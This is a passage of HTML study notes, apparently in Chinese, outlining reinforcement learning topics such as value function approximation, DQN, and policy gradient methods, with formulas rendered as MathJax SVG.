<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.919ex" height="1ex" role="img" focusable="false" viewBox="0 -431 406 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g></g></g></svg></mjx-container>-greedy</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="价值函数的近似-VFA"><a href="#价值函数的近似-VFA" class="headerlink" title="价值函数的近似 VFA"></a>价值函数的近似 VFA</h1><ul>
<li>函数近似（大规模问题）<ul>
<li>线性叠加<strong>特征</strong><ul>
<li>梯度下降</li>
</ul>
</li>
<li>非线性<ul>
<li>DNN</li>
</ul>
</li>
</ul>
</li>
<li>prediction<ul>
<li>Oracle <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.252ex" xmlns="http://www.w3.org/2000/svg" width="6.518ex" height="3.402ex" role="img" focusable="false" viewBox="0 -950.1 2881.1 1503.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="msub" transform="translate(1054.8, 451.6) scale(0.707)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mi" transform="translate(786, -150) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g><g data-mml-node="mrow" transform="translate(220, -345) scale(0.707)"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="msub" transform="translate(704, 0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="TeXAtom" transform="translate(828, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(361, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(890, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1341, 0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(1818, 0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(2284, 0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></g><rect width="2641.1" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></li>
<li>MC<ul>
<li>unbiased but noisy</li>
</ul>
</li>
<li>TD<ul>
<li>biased</li>
<li>semi-gradient</li>
</ul>
</li>
</ul>
</li>
<li>control<ul>
<li>semi-gradient Sarsa for VFA Control</li>
</ul>
</li>
<li>RL死亡三角 FA + bootstrap + off-policy</li>
<li><p>Batch</p>
</li>
<li><p>DQN</p>
<ul>
<li>Experience Replay</li>
<li>Fixed Target <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.978ex" height="1.779ex" role="img" focusable="false" viewBox="0 -775.2 1316.1 786.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mo" transform="translate(716, 363) scale(0.707)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g></g></g></g></svg></mjx-container><ul>
<li>增加稳定性</li>
<li>target延时更新</li>
<li>猫（estimate）抓老鼠（target）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><a href="https://deepmind.com/blog/article/Agent57-Outperforming-the-human-Atari-benchmark">Agent57</a></p>
<p><img src="https://kstatic.googleusercontent.com/files/f6b5f285173d4449285a8e812b8385f45c03f7104e1c41370a73e0c8558ff82d6a69e60962dd91c4972c444fd73bc4f98a06b5487eff5a037a37bc42f97cef3b" alt="DQN类方法的演进"></p>
<h1 id="策略优化基础（难）"><a href="#策略优化基础（难）" class="headerlink" title="策略优化基础（难）"></a>策略优化基础（难）</h1><ul>
<li>Policy-based RL<ul>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.029ex" xmlns="http://www.w3.org/2000/svg" width="1.17ex" height="1.005ex" role="img" focusable="false" viewBox="0 -431 517 444"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70F" d="M39 284Q18 284 18 294Q18 301 45 338T99 398Q134 425 164 429Q170 431 332 431Q492 431 497 429Q517 424 517 402Q517 388 508 376T485 360Q479 358 389 358T299 356Q298 355 283 274T251 109T233 20Q228 5 215 -4T186 -13Q153 -13 153 20V30L203 192Q214 228 227 272T248 336L254 357Q254 358 208 358Q206 358 197 358T183 359Q105 359 61 295Q56 287 53 286T39 284Z"></path></g></g></g></svg></mjx-container>为采样</li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="7.177ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3172.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="mi" transform="translate(570, -150) scale(0.707)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g></g><g data-mml-node="mo" transform="translate(951.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1340.6, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1809.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2254.3, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2783.3, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
<li>no value function</li>
<li>优势<ul>
<li>收敛性更好</li>
<li>高维动作空间上更有效</li>
<li>可以学习随机策略（输出为概率）<ul>
<li>Rock-Paper-Scissors</li>
<li>Aliased Gridworld</li>
</ul>
</li>
</ul>
</li>
<li>劣势<ul>
<li>局部最优解</li>
<li>高方差、测试结果不稳定</li>
<li>sample效率低（on-policy）</li>
</ul>
</li>
<li>极大化<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="4.253ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1880 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"></path></g><g data-mml-node="mo" transform="translate(633, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1022, 0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g><g data-mml-node="mo" transform="translate(1491, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><ul>
<li>可微分<ul>
<li>梯度上升</li>
<li>共轭梯度</li>
<li>quasi-newton</li>
</ul>
</li>
<li>不可微分 black-box Derivative-free<ul>
<li>CEM</li>
<li>Hill climbing</li>
<li>Evolution alg</li>
</ul>
</li>
</ul>
</li>
<li>Policy Example<ul>
<li>Softmax</li>
<li>Gaussian</li>
</ul>
</li>
</ul>
</li>
<li><p>MC Policy Gradient</p>
<ul>
<li>Score Function</li>
<li>公式推导</li>
</ul>
</li>
<li><p>减小PG方差</p>
<ul>
<li>Use temporal causality 时序因果关系<ul>
<li>REINFORCE (1992)</li>
</ul>
</li>
<li>Use a baseline <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="10.976ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4851.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mi" transform="translate(786, -150) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g><g data-mml-node="mo" transform="translate(1313.5, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(2313.7, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g></g><g data-mml-node="mo" transform="translate(3299, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(3688, 0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(469, -150) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g><g data-mml-node="mo" transform="translate(4462.3, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><ul>
<li>Vanilla PG (1999)</li>
</ul>
</li>
<li>Use a Critic <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="14.061ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6214.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mi" transform="translate(786, -150) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g><g data-mml-node="mo" transform="translate(1369, 0)"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(2646.8, 0)"><g data-mml-node="mi"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mi" transform="translate(791, -150) scale(0.707)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 